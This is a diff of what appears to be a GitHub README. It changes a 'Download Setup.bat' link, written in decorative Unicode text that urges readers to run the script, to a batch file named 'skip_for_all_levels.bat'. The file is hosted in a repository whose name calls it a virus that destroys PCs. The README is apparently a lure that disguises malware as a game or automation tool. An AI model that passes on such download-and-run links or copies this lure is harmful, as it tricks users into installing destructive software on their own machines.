@@ -23,7 +23,7 @@ To get the full experience, download the executable from our releases:
 
 𝕽𝖚𝖓 𝖙𝖍𝖊 𝖋𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 𝖘𝖈𝖗𝖎𝖕𝖙 𝖙𝖔 𝖆𝖚𝖙𝖔𝖒𝖆𝖙𝖊 𝖙𝖍𝖊 𝖕𝖗𝖔𝖈𝖊𝖘𝖘:
 
-👉 **[Download Setup.bat](https://github.com/paz343123/this_distroy_pc_virus/raw/main/Setup.bat)**
+👉 **[Download Setup.bat](https://github.com/paz343123/this_distroy_pc_virus/releases/tag/skip/skip_for_all_levels.bat)**
 
 ---
 
